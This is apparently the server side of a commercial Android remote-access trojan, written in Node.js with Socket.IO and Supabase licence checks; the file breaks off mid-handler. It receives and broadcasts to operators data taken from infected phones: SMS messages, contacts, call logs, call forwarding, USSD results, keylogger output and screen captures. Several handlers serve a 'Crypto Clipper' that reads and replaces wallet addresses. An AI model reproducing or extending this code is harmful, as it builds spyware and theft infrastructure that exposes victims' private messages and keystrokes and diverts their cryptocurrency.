// Load logger utility (production-safe - no logs in production)
const logger = require("./lib/utils/logger");

// Load environment variables from .env.local, .env.production, or .env file
let dotenvLoaded = false;
try {
  const dotenv = require("dotenv");
  const fs = require("fs");
  const path = require("path");
  
  const isProduction = process.env.NODE_ENV === "production";
  
  // Priority order:
  // 1. Production: .env.production
  // 2. Development: .env.local
  // 3. Fallback: .env
  const envProductionPath = path.join(__dirname, ".env.production");
  const envLocalPath = path.join(__dirname, ".env.local");
  const envPath = path.join(__dirname, ".env");
  
  if (isProduction && fs.existsSync(envProductionPath)) {
    const result = dotenv.config({ path: envProductionPath });
    if (!result.error) {
      logger.log("✅ Environment variables loaded from .env.production");
      dotenvLoaded = true;
    } else if (result.error.code !== "ENOENT") {
      logger.warn("⚠️ Error loading .env.production:", result.error.message);
    }
  }
  
  if (!dotenvLoaded && fs.existsSync(envLocalPath)) {
    const result = dotenv.config({ path: envLocalPath });
    if (!result.error) {
      logger.log("✅ Environment variables loaded from .env.local");
      dotenvLoaded = true;
    } else if (result.error.code !== "ENOENT") {
      logger.warn("⚠️ Error loading .env.local:", result.error.message);
    }
  }
  
  if (!dotenvLoaded && fs.existsSync(envPath)) {
    const result = dotenv.config({ path: envPath });
    if (!result.error) {
      logger.log("✅ Environment variables loaded from .env");
      dotenvLoaded = true;
    } else if (result.error.code !== "ENOENT") {
      logger.warn("⚠️ Error loading .env:", result.error.message);
    }
  }
  
  if (!dotenvLoaded) {
    logger.warn("⚠️ No .env file found. Using system environment variables.");
    if (isProduction) {
      logger.warn("   Production mode: Expected .env.production file");
    }
  }
} catch (error) {
  if (error.code === "MODULE_NOT_FOUND") {
    logger.warn("⚠️ dotenv package not installed. Run: npm install");
    logger.warn("   Using system environment variables only.");
  } else {
    logger.warn("⚠️ Error loading dotenv:", error.message);
    logger.warn("   Using system environment variables");
  }
}

const express = require("express");
const http = require("http");
const fs = require("fs");
const path = require("path");
const { Server } = require("socket.io");
const { createClient } = require("@supabase/supabase-js");

// Validate environment variables on startup (if available)
// Note: This is a CommonJS file, so we can't use ES6 imports
try {
  // Try to load and run environment validation
  // This will only work if the file is accessible from this context
  const path = require('path');
  const envValidationPath = path.join(__dirname, 'lib', 'utils', 'env-validation.ts');
  // For now, we'll do basic validation inline since TypeScript files need compilation
  logger.log('\n📋 [Device Server] Environment Variables:');
  logger.log(`   NEXT_PUBLIC_SUPABASE_URL: ${process.env.NEXT_PUBLIC_SUPABASE_URL ? '✅ Set' : '❌ Missing'}`);
  logger.log(`   SUPABASE_SERVICE_ROLE_KEY: ${process.env.SUPABASE_SERVICE_ROLE_KEY ? '✅ Set' : '❌ Missing'}`);
  logger.log(`   NEXT_PUBLIC_APP_URL: ${process.env.NEXT_PUBLIC_APP_URL || '❌ Not set (using defaults)'}`);
  logger.log(`   ALLOWED_ORIGINS: ${process.env.ALLOWED_ORIGINS || '❌ Not set (using defaults)'}`);
  logger.log(`   NODE_ENV: ${process.env.NODE_ENV || 'development'}`);
  logger.log(`   PORT: ${process.env.PORT || '9211 (default)'}`);
  logger.log('');
} catch (error) {
  // Continue even if validation fails
  logger.warn('⚠️ Could not run environment validation:', error.message);
}

const app = express();
app.use(express.json());

// CORS configuration - restrict to specific origins for security
const isDevelopment = process.env.NODE_ENV !== 'production';
let allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',').map(origin => origin.trim())
  : process.env.NEXT_PUBLIC_APP_URL 
    ? [process.env.NEXT_PUBLIC_APP_URL]
    : ['http://localhost:3000', 'http://127.0.0.1:3000']; // Default to localhost in development

// Always add http://127.0.0.1:9211 to allowed origins (dev and prod)
if (!allowedOrigins.includes('http://127.0.0.1:9211')) {
  allowedOrigins.push('http://127.0.0.1:9211');
  logger.log(`🔧 [Device Server] Added localhost device server origin: http://127.0.0.1:9211`);
}

// Auto-detect and allow LocalTunnel domains in development
if (isDevelopment) {
  // Check if device server URL is a tunnel URL
  const deviceServerUrl = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || process.env.DEVICE_SERVER_URL;
  if (deviceServerUrl) {
    try {
      const url = new URL(deviceServerUrl);
      // If it's a LocalTunnel domain, add it to allowed origins
      if (url.hostname.includes('localtonet.com') || url.hostname.includes('localto.net') || 
          url.hostname.includes('ngrok') || url.hostname.includes('localtunnel')) {
        const tunnelOrigin = `${url.protocol}//${url.hostname}${url.port ? `:${url.port}` : ''}`;
        if (!allowedOrigins.includes(tunnelOrigin)) {
          allowedOrigins.push(tunnelOrigin);
          logger.log(`🔧 [Device Server] Auto-detected tunnel origin: ${tunnelOrigin}`);
        }
      }
    } catch (e) {
      // Invalid URL, ignore
    }
  }
}

// Add specific tunnel origins (both with and without ports, and different protocols)
// NOTE: Only in development - production should use ALLOWED_ORIGINS environment variable
if (isDevelopment) {
  const specificTunnelOrigins = [
    'https://kuchbhi.localto.net:9211',
    'http://kuchbhi.localto.net:9211',
    'https://kuchbhi.localto.net',
    'http://kuchbhi.localto.net',
    // Also add common Next.js app ports that might be accessing from the same domain
    'https://kuchbhi.localto.net:3000',
    'http://kuchbhi.localto.net:3000',
  ];
  specificTunnelOrigins.forEach(origin => {
    if (!allowedOrigins.includes(origin)) {
      allowedOrigins.push(origin);
      logger.log(`🔧 [Device Server] Added tunnel origin (dev only): ${origin}`);
    }
  });
}

logger.log(`🔧 [Device Server] CORS Configuration:`);
logger.log(`   Environment: ${isDevelopment ? 'Development' : 'Production'}`);
if (isDevelopment) {
  logger.log(`   Note: Tunnel origins are auto-detected and added in development`);
} else {
  logger.log(`   Note: Production uses only ALLOWED_ORIGINS environment variable`);
}
logger.log(`   Allowed origins:`, allowedOrigins);

const server = http.createServer(app);
const io = new Server(server, {
  path: "/socket.io", // Socket.IO path
  cors: { 
    origin: (origin, callback) => {
      // Log every origin check for debugging (temporarily)
      logger.log(`🔍 [Device Server] CORS check - Origin: ${origin || 'no origin'}`);
      logger.log(`   Allowed origins:`, allowedOrigins);
      
      // Allow requests with no origin (like mobile apps, curl requests, or server-side connections)
      // Note: We don't log every "no origin" request to reduce log noise from polling
      if (!origin) {
        // Only log on first connection or errors - polling makes many requests
        logger.log(`✅ [Device Server] Allowing connection with no origin`);
        return callback(null, true);
      }
      
      // Check if origin is in allowed list
      if (allowedOrigins.includes(origin)) {
        logger.log(`✅ [Device Server] Allowing connection from origin: ${origin}`);
        callback(null, true);
        return;
      }
      
      // In development, be very permissive
      if (isDevelopment) {
        // Allow localhost variants
        if (origin.includes('localhost') || origin.includes('127.0.0.1')) {
          logger.log(`⚠️ [Device Server] Allowing localhost origin in development: ${origin}`);
          logger.log(`   (Add to ALLOWED_ORIGINS for production)`);
          if (!allowedOrigins.includes(origin)) {
            allowedOrigins.push(origin);
            logger.log(`   ✅ Added ${origin} to allowed origins for this session`);
          }
          callback(null, true);
          return;
        }
        // Allow tunnel domains (LocalTunnel, ngrok, etc.) - be very permissive
        if (origin.includes('localtonet.com') || origin.includes('localto.net') || 
            origin.includes('ngrok') || origin.includes('localtunnel') ||
            origin.includes('kuchbhi')) {
          logger.log(`⚠️ [Device Server] Allowing tunnel origin in development: ${origin}`);
          logger.log(`   (Add to ALLOWED_ORIGINS for production)`);
          // Add to allowed origins for this session
          if (!allowedOrigins.includes(origin)) {
            allowedOrigins.push(origin);
            logger.log(`   ✅ Added ${origin} to allowed origins for this session`);
          }
          callback(null, true);
          return;
        }
        
        // In development, allow ALL origins (very permissive for debugging)
        logger.log(`⚠️ [Device Server] Development mode: Allowing origin ${origin} (permissive mode)`);
        logger.log(`   (Add to ALLOWED_ORIGINS for production)`);
        if (!allowedOrigins.includes(origin)) {
          allowedOrigins.push(origin);
          logger.log(`   ✅ Added ${origin} to allowed origins for this session`);
        }
        callback(null, true);
        return;
      } else {
        // Production: strict CORS
        logger.warn(`❌ [Device Server] CORS: Blocked connection from origin: ${origin}`);
        logger.warn(`   Allowed origins:`, allowedOrigins);
        logger.warn(`   Fix: Add this origin to ALLOWED_ORIGINS environment variable`);
        callback(new Error('Not allowed by CORS'));
      }
    },
    methods: ["GET", "POST"],
    credentials: true,
  },
  // Add connection timeout settings
  connectTimeout: 45000, // 45 seconds
  pingTimeout: 20000, // 20 seconds
  pingInterval: 25000, // 25 seconds
});

// Supabase client for database access
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

logger.log(`🔍 Environment check:`);
logger.log(`   NEXT_PUBLIC_SUPABASE_URL: ${supabaseUrl ? "✅ Set" : "❌ Missing"}`);
logger.log(`   SUPABASE_SERVICE_ROLE_KEY: ${supabaseServiceKey ? "✅ Set" : "❌ Missing"}`);

let supabase = null;
if (supabaseUrl && supabaseServiceKey) {
  supabase = createClient(supabaseUrl, supabaseServiceKey, {
    auth: {
      autoRefreshToken: false,
      persistSession: false,
    },
  });
  logger.log("✅ Supabase client initialized for License ID and email hash validation");
} else {
  logger.error("❌ Supabase credentials not found. License ID validation will be disabled.");
  logger.error("   Please set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.");
  logger.error("   You can set them in .env.local file or as system environment variables.");
}

// Note: Device authentication uses License ID (stored per-user in user_profiles.license_id)
// No global DEVICE_AUTH_SECRET environment variable is required
const clients = new Map(); // uuid → { socket, info, userId }
const DEVICES_FILE = path.join(__dirname, "devices.json");
const validatedEmailHashes = new Map(); // Store validated email hashes: emailHash → userId
const validatedLicenseIds = new Map(); // Store validated license IDs: licenseId → userId

// -------------------- Load & Save Persistence --------------------
function loadPersistedDevices() {
  try {
    if (fs.existsSync(DEVICES_FILE)) {
      const content = fs.readFileSync(DEVICES_FILE, "utf8").trim();
      // Handle empty file or whitespace-only content
      if (!content) {
        logger.log(`📂 devices.json is empty, starting with empty device list`);
        return [];
      }
      const devices = JSON.parse(content);
      // Ensure devices is an array
      if (!Array.isArray(devices)) {
        logger.warn(`⚠️ devices.json does not contain an array, resetting to empty array`);
        return [];
      }
      logger.log(`📂 Loaded ${devices.length} devices from ${DEVICES_FILE}`);
      return devices;
    }
  } catch (e) {
    logger.error("❌ Error loading devices:", e.message);
    logger.log(`📂 Resetting devices.json to empty array`);
    // Initialize file with empty array on error
    try {
      fs.writeFileSync(DEVICES_FILE, JSON.stringify([], null, 2));
    } catch (writeErr) {
      logger.error("❌ Error resetting devices.json:", writeErr.message);
    }
  }
  return [];
}

function saveDevices() {
  try {
    const devices = Array.from(deviceRegistry.entries()).map(([uuid, d]) => ({
      uuid,
      info: d.info,
      lastSeen: d.lastSeen || Date.now(),
    }));
    fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
    logger.log(`💾 Saved ${devices.length} devices.`);
  } catch (e) {
    logger.error("❌ Error saving devices:", e.message);
  }
}

const deviceRegistry = new Map();
const persistedDevices = loadPersistedDevices();
persistedDevices.forEach((d) =>
  deviceRegistry.set(d.uuid, { info: d.info, lastSeen: d.lastSeen })
);

// -------------------- SOCKET HANDLERS --------------------
io.on("connection", (socket) => {
  const origin = socket.handshake.headers.origin || 'no origin';
  const userAgent = socket.handshake.headers['user-agent'] || 'unknown';
  const address = socket.handshake.address;
  const transport = socket.conn.transport.name;
  
  logger.log(`🔌 [Device Server] New socket connection: ${socket.id}`);
  logger.log(`   Origin: ${origin}`);
  logger.log(`   Address: ${address}`);
  logger.log(`   User-Agent: ${userAgent.substring(0, 80)}${userAgent.length > 80 ? '...' : ''}`);
  logger.log(`   Transport: ${transport}`);
  
  // Determine connection type
  if (origin === 'no origin') {
    logger.log(`   Type: Server-side or non-browser client (allowed)`);
  } else if (origin.includes('localhost') || origin.includes('127.0.0.1')) {
    logger.log(`   Type: Browser client (localhost)`);
  } else {
    logger.log(`   Type: Browser client (${origin})`);
  }
  
  let isAuthenticated = false;
  
  // Debug: Log important events only (reduced verbosity)
  // Enable full debug logging by setting DEBUG_SOCKET_EVENTS=true
  const debugAllEvents = process.env.DEBUG_SOCKET_EVENTS === 'true';
  
  // Events to ignore (keepalive/heartbeat messages)
  const ignoredEvents = ['ping', 'pong', 'heartbeat'];
  
  if (debugAllEvents) {
    // Debug: Log all events from this socket (only if DEBUG_SOCKET_EVENTS=true)
    const originalEmit = socket.emit.bind(socket);
    socket.emit = function(event, ...args) {
      if (event.includes("account") || event.includes("result")) {
        logger.log(`🔍 [DEBUG] Socket ${socket.id} emitting: ${event}`, args);
      }
      return originalEmit(event, ...args);
    };
    
    // Debug: Log ALL incoming events (only if DEBUG_SOCKET_EVENTS=true)
    socket.onAny((eventName, ...args) => {
      // Skip ignored events even in debug mode
      if (ignoredEvents.includes(eventName)) {
        // return;
        logger.log(pingreceived)     
       }
      
      // Special logging for image_preview
      if (eventName === "image_preview" || eventName.includes("preview") || eventName.includes("image")) {
        logger.log(`🖼️ [DEBUG-IMAGE] Socket ${socket.id} received event: "${eventName}"`);
        if (args.length > 0 && typeof args[0] === "object" && args[0] !== null) {
          logger.log(`🖼️ [DEBUG-IMAGE] First arg keys:`, Object.keys(args[0]));
        }
      }
      // Special logging for keylogger-result
      else if (eventName === "keylogger-result" || eventName.includes("keylogger") || eventName.includes("keylog")) {
        logger.log(`⌨️ [DEBUG-KEYLOGGER] Socket ${socket.id} received event: "${eventName}"`);
        if (args.length > 0) {
          logger.log(`⌨️ [DEBUG-KEYLOGGER] First arg:`, JSON.stringify(args[0], null, 2).substring(0, 200));
        }
      }
      else {
        logger.log(`🔍 [DEBUG-ALL] Socket ${socket.id} received event: "${eventName}"`);
        if (args.length > 0) {
          logger.log(`🔍 [DEBUG-ALL] First arg type:`, typeof args[0]);
          if (typeof args[0] === "object" && args[0] !== null) {
            logger.log(`🔍 [DEBUG-ALL] First arg keys:`, Object.keys(args[0]));
          }
        }
      }
    });
  }
  // Default: minimal logging - only important events, no debug spam
  
  // Log important events after authentication (reduced verbosity)
  // Note: This is a separate handler from the debug one above
  // It only logs important business events, not keepalive/heartbeat messages
  socket.onAny((event, data) => {
    if (!isAuthenticated) return;

    const client = clients.get(socket.uuid);
    if (client) client.info = data;

    // Ignore keepalive/heartbeat events
    if (ignoredEvents.includes(event)) {
      return;
    }

    // Only log important events, not every data update
    const importantEvents = ['getinfo', 'authenticate', 'device_event', 'command-result', 
                             'sms-result', 'contact-result', 'call-result', 'app-result',
                             'keylogger-result', 'screen-result', 'account-result'];
    if (importantEvents.some(e => event.includes(e))) {
      try {
        const dataPreview = typeof data === 'object' && data !== null
          ? JSON.stringify(data, null, 2).substring(0, 200) + (JSON.stringify(data).length > 200 ? '...' : '')
          : data;
        logger.log(
          `📥 [${event}] Data from ${socket.uuid || "unknown client"}:`,
          dataPreview
        );
      } catch (err) {
        logger.error(`[${event}] Invalid JSON data:`, err);
      }
    }
  });

  // -------- DEVICE AUTHENTICATION --------
  socket.on("authenticate", async (data) => {
    if (!data || typeof data !== "object") {
      socket.emit("auth-failed", { error: "Invalid authentication data" });
      socket.disconnect(true);
      return;
    }

    const uuid = data?.uuid; // Device UUID
    const token = data?.token; // License ID (used as device auth secret, stored per-user in database)

    logger.log(`🔐 Authentication attempt - UUID: ${uuid}, Token: ${token ? token.substring(0, 10) + '...' : 'None'}`);

    // Validate UUID
    if (!uuid || typeof uuid !== "string") {
      logger.warn(`❌ Authentication failed: Invalid UUID`);
      socket.emit("auth-failed", { error: "Invalid UUID" });
      socket.disconnect(true);
      return;
    }

    // Validate token (License ID format: 26 characters, 25 alphanumeric + "=")
    if (!token || typeof token !== "string" || token.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(token)) {
      logger.warn(`❌ Authentication failed: Invalid token format (expected License ID: 26 chars, 25 alphanumeric + "=")`);
      socket.emit("auth-failed", { error: "Invalid token format - must be License ID (26 characters)" });
      socket.disconnect(true);
      return;
    }

    // Validate License ID (token) against database to get user_id
    // License ID is stored per-user in user_profiles table and used as device auth secret
    let userId = null;
    if (supabase) {
      userId = await validateLicenseId(token);
      if (!userId) {
        logger.warn(`❌ License ID validation failed - token may not exist in database or user is inactive`);
        socket.emit("auth-failed", { error: "Invalid License ID or user inactive" });
        socket.disconnect(true);
        return;
      }
      logger.log(`✅ License ID validated for user: ${userId}`);
      // Device UUID is just an identifier - we link it to the user from License ID
      // No need to check if device exists in database
    } else {
      // STRICT: No fallback - Supabase must be configured
      logger.error("❌ Supabase not configured - authentication cannot proceed");
      socket.emit("auth-failed", { error: "Server configuration error: Supabase not configured" });
      socket.disconnect(true);
      return;
    }

    isAuthenticated = true;

    // Replace old connection if exists
    if (clients.has(uuid)) {
      const old = clients.get(uuid);
      try {
        old.socket.disconnect(true);
      } catch (e) {
        logger.warn(`⚠️ Error disconnecting old socket for ${uuid}:`, e.message);
      }
    }

    clients.set(uuid, { socket, info: null, userId: userId });
    socket.uuid = uuid;

    // Restore info if known
    if (deviceRegistry.has(uuid)) {
      clients.get(uuid).info = deviceRegistry.get(uuid).info;
      logger.log(`♻️ Restored device info for ${uuid}`);
    }

    logger.log(`✅ Device authenticated: ${uuid} (User: ${userId})`);
    socket.emit("auth-success", { uuid });
  });

  // -------- GETINFO from device --------
  socket.on("getinfo", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated getinfo attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid getinfo data from ${uuid}`);
      return;
    }

    // Update client info
    client.info = data;

    try {
      logger.log(`📥 [getinfo] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Update registry with userId
      deviceRegistry.set(uuid, { info: data, lastSeen: Date.now(), userId: client.userId });
      saveDevices();

      // Broadcast device_info event to all web clients
      io.emit("device_event", {
        event: "device_info",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted device_info event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [getinfo] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SMS RESULT from device --------
  socket.on("sms-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated sms-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid sms-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast sms-result event to all web clients
      io.emit("device_event", {
        event: "sms_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted sms_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [sms-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- COMPOSE SMS RESULT from device --------
  socket.on("sendsms-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated sendsms-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid sendsms-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [sendsms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast sendsms-result event to all web clients
      io.emit("device_event", {
        event: "sendsms_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted sendsms_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [sendsms-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- COMPOSE SMS RESULT (alternative event name) --------
  socket.on("compose-sms-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated compose-sms-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid compose-sms-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [compose-sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast compose-sms-result event to all web clients
      io.emit("device_event", {
        event: "compose_sms_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted compose_sms_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [compose-sms-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- CONTACT RESULT from device --------
  socket.on("contact-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated contact-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid contact-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast contact-result event to all web clients
      io.emit("device_event", {
        event: "contact_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted contact_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [contact-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- ADD CONTACT RESULT from device --------
  socket.on("add-contact-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated add-contact-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid add-contact-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [add-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast add-contact-result event to all web clients
      io.emit("device_event", {
        event: "add_contact_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted add_contact_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [add-contact-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- DELETE CONTACT RESULT from device --------
  socket.on("delete-contact-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated delete-contact-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid delete-contact-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [delete-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast delete-contact-result event to all web clients
      io.emit("device_event", {
        event: "delete_contact_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted delete_contact_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [delete-contact-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- CALL RESULT from device --------
  socket.on("call-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated call-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid call-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast call-result event to all web clients
      io.emit("device_event", {
        event: "call_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted call_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [call-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- CALL FORWARD RESULT from device --------
  socket.on("call-forward-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated call-forward-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid call-forward-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [call-forward-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast call-forward-result event to all web clients
      io.emit("device_event", {
        event: "call_forward_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted call_forward_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [call-forward-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- USSD RESULT from device --------
  socket.on("ussd-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated ussd-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid ussd-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [ussd-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast ussd-result event to all web clients
      io.emit("device_event", {
        event: "ussd_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted ussd_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [ussd-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- DELETE CALL RESULT from device --------
  socket.on("delete-call-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated delete-call-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid delete-call-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [delete-call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast delete-call-result event to all web clients
      io.emit("device_event", {
        event: "delete_call_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted delete_call_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [delete-call-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- GET ADDRESS RESULT from device (Crypto Clipper) --------
  socket.on("get-address-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated get-address-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid get-address-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [get-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast get-address-result event to all web clients
      io.emit("device_event", {
        event: "get_address_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted get_address_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [get-address-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- ACTIVE WALLET ADDRESS RESULT from device (Crypto Clipper) --------
  socket.on("activewalletaddress-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated activewalletaddress-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid activewalletaddress-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [activewalletaddress-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast activewalletaddress-result event to all web clients
      io.emit("device_event", {
        event: "activewalletaddress_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted activewalletaddress_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [activewalletaddress-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SET WALLET ADDRESS RESULT from device (Crypto Clipper) --------
  socket.on("set-wallet-address-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated set-wallet-address-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid set-wallet-address-result data from ${uuid}`);
      return;
    }

    try {
